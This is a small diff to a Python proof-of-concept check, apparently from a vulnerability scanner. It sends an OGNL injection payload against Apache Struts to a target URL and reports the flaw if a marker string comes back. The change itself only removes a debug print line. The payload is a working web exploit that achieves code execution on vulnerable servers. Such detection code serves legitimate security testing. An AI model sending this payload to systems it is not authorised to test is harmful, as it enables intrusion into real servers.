@@ -33,7 +33,7 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))      
             payloadurl = """?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context%5B%23parameters.obj%5B0%5d%5d.getWriter%28%29.print%28%23parameters.content%5B0%5d%2b602%2b53718%29,1?%23xx:%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=92933839f1efb2da9a4799753ee8d79c"""
             request = requests.get('{target}{payload}'.format(target=self.target,payload=payloadurl))
-            print request.url
+            
             r = request.text
             if '92933839f1efb2da9a4799753ee8d79c' in r:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
